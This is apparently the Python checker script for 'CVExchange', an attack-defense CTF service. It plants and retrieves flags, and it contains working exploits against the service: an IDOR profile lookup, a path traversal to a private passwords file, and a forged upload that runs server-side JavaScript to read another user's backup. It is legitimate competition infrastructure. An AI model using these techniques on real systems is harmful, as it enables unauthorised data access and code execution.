from typing import (
    Optional,
)
from httpx import AsyncClient, Request
from enochecker3 import (
    ChainDB,
    Enochecker,
    GetflagCheckerTaskMessage,
    MumbleException,
    PutflagCheckerTaskMessage,
    ExploitCheckerTaskMessage,
    InternalErrorException,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from bs4 import BeautifulSoup
import random
import string
import base64
import randfacts
import re
import json
import hashlib
from faker import Faker

# initialize quotes and faker
fake = Faker()
with open("quotes.json", "r") as file:
    quotes = json.load(file)


SERVICE_PORT = 1337
checker = Enochecker("CVExchange", SERVICE_PORT)
app = lambda: checker.app


def fileHash(file: str) -> str:
    hash = hashlib.sha1()
    with open(file, "rb") as f:
        data = f.read()
        hash.update(data)

    return hash.hexdigest()


def parseCookie(cookieString):
    start = cookieString.find("jwtToken=") + len("jwtToken=")
    end = cookieString.find(" ", start)
    if end == -1:
        end = len(cookieString)
    return cookieString[start:end]


def getRandom(length) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=length))


def getFake(type: str) -> str:
    res = None
    if type == "name":
        res = fake.name()
    elif type == "text" or type == "longtext":
        res = fake.text()
    res = re.sub(r"\s+", "", res)
    res = re.sub(r"[^\w\s-]", "", res)

    if type == "name":
        return res[:15] + str(random.randint(0, 10000))
    elif type == "longtext":
        return res[:400]

    return res[:15]


async def register(client: AsyncClient) -> tuple[str, str, str, str]:
    name, password = getFake("name"), getRandom(10)
    email = getRandom(5) + "@" + getRandom(5) + "." + getRandom(3)
    registerResp = await client.post(
        "/user/register", json={"name": name, "email": email, "password": password}
    )
    assert_equals(
        registerResp.status_code,
        302,
        f"couldn't register a new user with name: {name} under /user/register",
    )
    cookie = parseCookie(str(client.cookies))

    # scour the frontpage to retrieve our unique userId
    profileResp = await client.get("/", cookies={"jwtToken": cookie})
    assert_equals(profileResp.status_code, 200, "couldn't retrieve frontpage under /")
    html = BeautifulSoup(profileResp, "html.parser")
    userClass = html.find("span", attrs={"class": "user"})
    profileLink = userClass.find("a")
    userId = profileLink["href"].split("/")[-1]

    return email, password, cookie, userId


async def login(email: str, password: str, client: AsyncClient) -> tuple[str, str]:
    loginResp = await client.post(
        "/user/login", json={"email": email, "password": password}
    )
    assert_equals(loginResp.status_code, 302, "couldn't login with userdata")
    cookie = parseCookie(str(client.cookies))

    return cookie


@checker.putflag(0)
async def putflag_note(
    task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> str:
    # register so client has a cookie
    email, password, cookie, userId = await register(client)
    await db.set("userinfo", (email, password, userId))

    # deposit the flag as the users personal note
    uploadResp = await client.post(
        "/user/editnote", json={"text": task.flag}, cookies={"jwtToken": cookie}
    )
    assert_equals(
        uploadResp.status_code, 302, "couldn't store flag under /user/editnote"
    )

    return userId


@checker.putflag(1)
async def putflag_private(
    task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> str:
    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # create a .txt file containing the flag and upload it to /files/private
    with open("passwords.txt", "w") as flagFile:
        flagFile.write(task.flag)

    filehash = fileHash("passwords.txt")
    await db.set("userinfo", (email, password, userId, filehash))

    uploadResp = await client.post(
        "/files/private",
        files={"privateFile": open("passwords.txt", "rb")},
        cookies={"jwtToken": cookie},
    )
    assert_equals(
        uploadResp.status_code, 302, "couln't store flag under /files/private"
    )

    return userId


@checker.putflag(2)
async def putflag_backup(
    task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> str:
    # register so client has a cookie
    email, password, cookie, userId = await register(client)
    await db.set("userinfo", (email, password, userId))

    # create a .txt file containing the flag and upload it to /files/backup
    with open("backup.txt", "w") as flagFile:
        flagFile.write(task.flag)

    uploadResp = await client.post(
        "/files/backup",
        files={"backupFile": open("backup.txt", "rb")},
        cookies={"jwtToken": cookie},
    )
    assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/backup")

    return userId


@checker.putnoise(0)
async def putnoise_fact_post(client: AsyncClient, db: ChainDB) -> None:
    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # generate random fact
    title = f"Fact of the Minute #{random.randint(0,500)}"
    text = randfacts.get_fact()

    # create a new subexchange and subscribe to it
    # subResp = await client.post("/subs/new", json={"name": getRandom(10), "description": getRandom(10), "sidebar": getRandom(10)}, cookies={"jwtToken": cookie})
    # subId = subResp.headers['Location'].split('/')[-1]
    subResp = await client.get(f"/subs/subscribe/1", cookies={"jwtToken": cookie})
    assert_equals(
        subResp.status_code, 302, "couldn't subscribe under /subs/subscribe/1"
    )

    # post the fact to the generated subexchange
    uploadResp = await client.post(
        "/posts/new",
        json={"title": title, "text": text, "subid": 1},
        cookies={"jwtToken": cookie},
    )
    assert_equals(uploadResp.status_code, 302, "couldn't create post under /posts/new")

    # save the redirection URL and other postinfo in DB
    await db.set("postinfo", (uploadResp.headers["Location"], title, text))


@checker.putnoise(1)
async def putnoise_quote_post(client: AsyncClient, db: ChainDB) -> None:
    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # generate a random quote
    title = f"Quote of the Minute #{random.randint(0,500)}"
    meta = random.choice(quotes)
    text = (
        "Author: "
        + meta["author"]
        + "\r\n\r\n Book: "
        + meta["book"]
        + "\r\n\r\n Quote: "
        + meta["quote"]
    )

    # create a new subexchange and subscribe to it
    # subResp = await client.post("/subs/new", json={"name": getRandom(10), "description": getRandom(10), "sidebar": getRandom(10)}, cookies={"jwtToken": cookie})
    # subId = subResp.headers['Location'].split('/')[-1]
    subResp = await client.get(f"/subs/subscribe/2", cookies={"jwtToken": cookie})
    assert_equals(
        subResp.status_code, 302, "couldn't subscribe under /subs/subscribe/2"
    )

    # post the quote
    uploadResp = await client.post(
        "/posts/new",
        json={"title": title, "text": text, "subid": 2},
        cookies={"jwtToken": cookie},
    )
    assert_equals(uploadResp.status_code, 302, "couldn't create post under /posts/new")

    # save the redirection URL and other postinfo in DB
    await db.set("postinfo", (uploadResp.headers["Location"], title, text))


@checker.getflag(0)
async def getflag_note(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    # retrieve login data from the DB
    try:
        email, password, userId = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")

    # login with registration data from putflag(0)
    cookie = await login(email, password, client)

    # now that we have the userId we visit our profile page and find the flag
    flagResp = await client.get(f"/user/profile/{userId}", cookies={"jwtToken": cookie})
    assert_equals(
        flagResp.status_code, 200, "couldn't get profile page containing the flag"
    )
    assert_in(task.flag, flagResp.text, "flag not found")


@checker.getflag(1)
async def getflag_private(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    # retrieve login data from the DB
    try:
        email, password, userId, filehash = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")

    # login with registration data from putflag(1)
    cookie = await login(email, password, client)

    # visit the users private upload directory to find the flag
    flagResp = await client.get(
        f"/uploads/{base64.b64encode(userId.encode()).decode()}/private/passwords.txt",
        cookies={"jwtToken": cookie},
    )
    assert_equals(
        flagResp.status_code, 200, "couldn't retrieve the flag from private directory"
    )
    assert_in(task.flag, flagResp.text, "flag not found")

    hashResp = await client.get(
        f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/verify.js",
        cookies={"jwtToken": cookie},
    )
    assert_equals(hashResp.status_code, 200, "couldn't get page for integrity check")
    assert_in(filehash, hashResp.text, "integrity check for private file failed")


@checker.getflag(2)
async def getflag_backup(
    task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB
) -> None:
    # retrieve login data from the DB
    try:
        email, password, userId = await db.get("userinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve userinfo from DB")

    # login with registration data from putflag(2)
    cookie = await login(email, password, client)

    # visit the users backup directory to retrieve the flag
    flagResp = await client.get(
        f"/files/retrieve/{base64.b64encode(userId.encode()).decode()}/backup.txt",
        cookies={"jwtToken": cookie},
    )
    assert_equals(
        flagResp.status_code, 200, "couldn't retrieve the flag from backup directory"
    )
    assert_in(task.flag, flagResp.text, "flag not found")


@checker.getnoise(0)
async def getnoise_fact_post(client: AsyncClient, db: ChainDB) -> None:
    # retrieve postinfo from the DB
    try:
        postURL, title, text = await db.get("postinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve postinfo from DB")

    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # visit the postURL to retrieve noise
    noiseResp = await client.get(postURL, cookies={"jwtToken": cookie})
    assert_equals(noiseResp.status_code, 200, "couldn't get post containing fact")

    # get the sanitized version of the post text
    convertResp = await client.post(
        f"/posts/sanitize", json={"text": text}, cookies={"jwtToken": cookie}
    )
    assert_equals(
        convertResp.status_code, 200, "couldn't convert post under /posts/sanitize"
    )
    assert_in(convertResp.text, noiseResp.text, "fact not found in post")


@checker.getnoise(1)
async def getnoise_quote_post(client: AsyncClient, db: ChainDB) -> None:
    # retrieve postinfo from the DB
    try:
        postURL, title, text = await db.get("postinfo")
    except KeyError:
        raise MumbleException("couldn't retrieve postinfo from DB")

    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # visit the postURL to retrieve noise
    noiseResp = await client.get(postURL, cookies={"jwtToken": cookie})
    assert_equals(noiseResp.status_code, 200, "couldn't get post containing quote")

    # get the sanitized version of the post text
    convertResp = await client.post(
        f"/posts/sanitize", json={"text": text}, cookies={"jwtToken": cookie}
    )
    assert_equals(
        convertResp.status_code, 200, "couldn't convert post under /posts/sanitize"
    )
    assert_in(convertResp.text, noiseResp.text, "quote not found in post")


@checker.havoc(0)
async def havoc_doabunchofstuffinb64(client: AsyncClient) -> None:
    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # create a new subexchange and subscribe to it
    name = getFake("text") + str(random.randint(0, 10000))
    description = base64.b64encode(getFake("text").encode()).decode()
    sidebar = base64.b64encode(getFake("text").encode()).decode()
    subCreateResp = await client.post(
        "/subs/new",
        json={"name": name, "description": description, "sidebar": sidebar},
        cookies={"jwtToken": cookie},
    )
    assert_equals(
        subCreateResp.status_code, 302, "couldn't create new sub under /subs/new"
    )
    subId = subCreateResp.headers["Location"].split("/")[-1]
    subResp = await client.get(f"/subs/subscribe/{subId}", cookies={"jwtToken": cookie})
    assert_equals(
        subResp.status_code, 302, f"couldn't subscribe under /subs/subscribe/{subId}"
    )

    # post some random stuff to the created subexchange
    title = base64.b64encode(getFake("text").encode()).decode()
    text = base64.b64encode(getFake("longtext").encode()).decode()
    postResp = await client.post(
        "/posts/new",
        json={"title": title, "text": text, "subid": subId},
        cookies={"jwtToken": cookie},
    )
    assert_equals(postResp.status_code, 302, "couldn't create post under /posts/new")
    postId = postResp.headers["Location"].split("/")[-1]

    # comment on the created post
    comment = base64.b64encode(getFake("longtext").encode()).decode()
    commentResp = await client.post(
        "/comments/new",
        json={"comment": comment, "postId": postId},
        cookies={"jwtToken": cookie},
    )
    assert_equals(
        commentResp.status_code, 302, "couldn't create post under /comments/new"
    )

    # retrieve the created post
    checkResp = await client.get(f"/posts/{postId}", cookies={"jwtToken": cookie})
    assert_equals(
        checkResp.status_code, 200, f"couldn't get post under /posts/{postId}"
    )


@checker.exploit(0)
async def exploit_note(
    task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient
) -> Optional[str]:
    # retrieve userId from attackinfo
    if task.attack_info == "":
        raise InternalErrorException("Attack info is empty")
    victimUserId = task.attack_info

    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # exploit
    flagResp = await client.get(
        f"/user/profile/{victimUserId}?userId={victimUserId}",
        cookies={"jwtToken": cookie},
    )
    assert_equals(flagResp.status_code, 200, "couldn't load profile page with flag")

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag


@checker.exploit(1)
async def exploit_private(
    task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient
) -> Optional[str]:
    # retrieve userId from attackinfo
    if task.attack_info == "":
        raise InternalErrorException("Attack info is empty")
    victimUserId = task.attack_info

    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # exploit
    flagResp = await client.get(
        f"/uploads/{base64.b64encode(victimUserId.encode()).decode()}%2Fpublic%2F..%2Fprivate%2Fpasswords.txt",
        cookies={"jwtToken": cookie},
    )
    assert_equals(
        flagResp.status_code, 200, "couldn't load flag from private directory"
    )

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag


@checker.exploit(2)
async def exploit_backup(
    task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient
) -> Optional[str]:
    # retrieve userId from attackinfo
    if task.attack_info == "":
        raise InternalErrorException("Attack info is empty")
    victimUserId = task.attack_info

    # register so client has a cookie
    email, password, cookie, userId = await register(client)

    # create a file containing js that will be executed on server side to reveal the users flag
    with open("getflag.jpg.js", "w") as getFlag:
        getFlag.write(
            f"""const fs = require('fs');
                            const path = require('path'); 
                            const flagPath = path.join(__dirname, '../../../backups', '{base64.b64encode(victimUserId.encode()).decode()}', 'backup.txt');
                            function readFlagFile() {{
                                try {{
                                    const flag = fs.readFileSync(flagPath, 'utf8');
                                    return flag;
                                }} catch (error) {{
                                    console.error(error);
                                    return 'Failed to read flag file';
                                }}
                            }}
                            const result = readFlagFile();
                            console.log(result);"""
        )

    # add the content-type header to the file
    with open("getflag.jpg.js", "rb") as file:
        data = file.read()
    payload = b"Content-Type: image/jpeg\r\n\r\n" + data

    # create a request for a file upload
    request = Request(
        "POST",
        f"http://{task.address}:{SERVICE_PORT}/files/upload",
        files={"profilePicture": payload},
        cookies={"jwtToken": cookie},
    )

    # copy the headers for our actual request
    headers = {}
    for header, value in request.headers.items():
        headers[header] = value

    # replace the original content-type of the request and the filename and also adjust the content-length header
    betterRequest = request.read().replace(
        b"Content-Type: application/octet-stream\r\n\r\n", b""
    )
    betterRequest = betterRequest.replace(
        b'filename="upload"', b'filename="getflag.jpg.js"'
    )

    length = headers["content-length"]
    newLength = int(length) - 34
    headers["content-length"] = str(newLength)

    # upload the file to our public upload directory, bypassing server side filters
    uploadResp = await client.post(
        "/files/upload", headers=headers, content=betterRequest
    )
    assert_equals(
        uploadResp.status_code, 302, "couldn't upload exploit to /files/upload"
    )

    # the file gets evaluated on server side and we should get the flag in the response
    flagResp = await client.get(
        f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js",
        cookies={"jwtToken": cookie},
    )
    assert_equals(
        flagResp.status_code,
        200,
        f"couldn't retrieve flag via /uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js",
    )

    # retrieve and return the flag
    if flag := searcher.search_flag(flagResp.text):
        return flag
